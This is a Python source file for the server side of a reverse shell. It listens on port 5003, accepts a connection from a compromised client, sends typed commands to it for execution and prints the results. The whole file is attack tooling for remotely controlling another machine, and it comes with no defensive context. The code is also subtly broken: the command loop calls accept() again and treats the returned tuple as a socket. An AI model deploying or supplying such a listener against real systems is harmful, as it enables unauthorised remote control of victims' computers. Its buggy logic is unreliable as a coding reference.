import socket

class Shell():
    def __init__(self):
        self.SERVER_HOST = "0.0.0.0"
        self.SERVER_PORT = 5003
        self.BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
        # separator string for sending 2 messages in one go
        self.SEPARATOR = "<sep>"
        # create a socket object
        self.s = socket.socket()

    def create_socket(self):
        # bind the socket to all IP addresses of this host
        self.s.bind((self.SERVER_HOST, self.SERVER_PORT))
        # make the PORT reusable
        # when you run the server multiple times in Linux, Address already in use error will raise
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.listen(5)
        print(f"Listening as {self.SERVER_HOST}:{self.SERVER_PORT} ...")
        # accept any connections attempted
        client_socket, client_address = self.s.accept()
        # print connection IP and port
        print(f"{client_address[0]}:{client_address[1]} Connected!")

        # receiving the current working directory of the client
        cwd = client_socket.recv(self.BUFFER_SIZE).decode()
        print("[+] Current working directory:", cwd)

    def command_loop(self):
        # accept any connections attempted
        client_socket = self.s.accept()
        # receiving the current working directory of the client
        cwd = client_socket.recv(self.BUFFER_SIZE).decode()
        
        print("[+] Current working directory:", cwd)
        while True:
            # get the command from prompt
            command = input(f"{cwd} $> ")
            if not command.strip():
                # empty command
                continue
            # send the command to the client
            client_socket.send(command.encode())
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            # retrieve command results
            output = client_socket.recv(self.BUFFER_SIZE).decode()
            print("output:", output)
            # split command output and current directory
            results, cwd = output.split(self.SEPARATOR)
            # print output
            print(results)
        # close connection to the client
        client_socket.close()
        # close server connection
        self.s.close()

def main():
    shell = Shell()
    shell.create_socket()
    shell.command_loop()
    
if __name__ == "__main__":
    main()